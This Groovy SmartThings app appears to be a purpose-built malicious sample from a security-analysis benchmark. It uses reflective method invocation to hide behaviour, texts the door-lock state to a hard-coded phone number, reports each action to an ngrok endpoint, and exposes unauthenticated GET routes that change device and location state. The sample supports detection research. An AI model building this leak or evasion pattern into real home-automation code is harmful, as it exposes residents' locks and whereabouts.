/**
 *  Copyright 2015 SmartThings
 *
 */

definition(
    name: "Call by reflection 2",
    namespace: "CSL",
    author: "Amit Sikder",
    updated: "Leo Babun and Z. Berkay Celik",
    description: "A string is used to invoke a method via call by reflection. A method is defined to leak state of a door. In line 47, a string with the state of the door lock is sent via a hard-coded phone number. In line 68, sendSms function is defined.",
    category: "Safety & Security",
    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience%402x.png",
    oauth: true
)

preferences {
	section("When I leave...") {
		input "presence1", "capability.presenceSensor", title: "Who?", multiple: true
	}
	section("Lock the lock...") {
		input "lock1","capability.lock", multiple: true
		input "unlock", "enum", title: "Unlock when presence is detected?", options: ["Yes","No"]
        input("recipients", "contact", title: "Send notifications to") {
            input "spam", "enum", title: "Send Me Notifications?", options: ["Yes", "No"]
        }
	}
}

def installed()
{
	subscribe(presence1, "presence", presence)
}

def updated()
{
	unsubscribe()
	subscribe(presence1, "presence", presence)
}

def presence(evt)
{
	def data = [:]  // instrumented code
	def cnt = 0 // instrumented code
	if (evt.value == "present") {
		if (unlock == "Yes") {
			def anyLocked = lock1.count{it.currentLock == "unlocked"} != lock1.size()
			if (anyLocked) {
				cnt++ // instrumented code
				data['action'+cnt] = "sink1 : Dynamic method invocation ${device}"  // instrumented code
				"$device"()  // sink 1
				sendMessage("The ${state.Dvice} is locked")
			}
			cnt++ // instrumented code
			data['action'+cnt] = "sink2 : lock1 unlock"  // instrumented code
			lock1.unlock()  // sink 2
		}
	}
	else {
		def nobodyHome = presence1.find{it.currentPresence == "present"} == null
		if (nobodyHome) {
			def anyUnlocked = lock1.count{it.currentLock == "locked"} != lock1.size()
			if (anyUnlocked) {
				sendMessage("Doors locked after everyone departed")
			}
			cnt++ // instrumented code
			data['action'+cnt] = "sink3 : lock1 lock"  // instrumented code
			lock1.lock()  // sink 3
		}
	}
	sendRequest(data)   // instrumented code
}

def device () {
	state.Device = "${lock1.displayName}"
}

def sendMessage(msg) {
	def data = [:]  // instrumented code
	def cnt = 0 // instrumented code
	def phone = "(111)-111-1111"

    if (location.contactBookEnabled) {
		cnt++ // instrumented code
		data['action'+cnt] = "sink4 : sendSms ${phone} ${msg}"  // instrumented code
        sendSms(phone, msg)  // sink 4
    }
    else {
        if (spam == "Yes") {
			cnt++ // instrumented code
			data['action'+cnt] = "sink5 : sendPush ${msg}"  // instrumented code
            sendPush msg  // sink 5
        }
    }
	sendRequest(data)   // instrumented code
}


// the following simulates instrumented end point codes for web services hookup
mappings {
	// this endpoint supports a GET request. It will execute the specified command on the configured switches
	path("/people/:command") {
		//log.info("/people/:command")
		action: [
				GET: "people"
		]
	}
}

/*
	this handles a GET request to the /people/:command endpoint.
    /people/on will turn the presenceSensor on, and /people/off will turn the presenceSensor off.
    This method doesn't work because only Device handler can send/modify device states (present or not present)
    It cannot be modified in the app code
*/
void people() {
	// use the built-in request object to get the command parameter
	def command = params.command
	log.debug("Receive command: $command")
	// inject all possible device commands
	// following is not the exhaustive list yet
	switch(command) {
		case "on":
			people.on()
			break
		case "off":
			people.off()
			break
		case "wet":
			people.wet()
			break
		case "dry":
			people.dry()
			break
		case "present":
			people.present()
			break
		case "notpresent":
			people.notpresent()
			break
		case "active":
			people.active()
			break
		case "inactive":
			people.inactive()
			break
		default:
			httpError(400, "$command is not a valid command for all switches specified")
	}
}


mappings {
	// this is the end point for simulating user location
	path("/location/:command") {
		//log.info("/location/:command")
		action: [
				GET: "location"
		]
	}
}

void location() {
	//eventHandler(evt)
	def command = params.command
	log.debug("Receive command: $command")

	// format command
	command = command.replaceFirst(command[0], command[0].toUpperCase()) // home -> Home, away -> Away

	def currMode = location.currentMode // "Home", "Away", etc.
	log.debug "current mode is $currMode"

	location.setMode(command)  // change location
}

def sendRequest(data) {
	// [q:'Minneapolis', mode: 'json']
	def params = [
			uri:  'https://62f870a15b61.ngrok.io/',
			path: 'fuzzthings/things.php',
			contentType: 'application/json',
			query: data
	]
	try {
		httpGet(params){resp ->
			log.debug "connection okay"
		}
	} catch (e) {
		log.error "error: $e"
	}
}
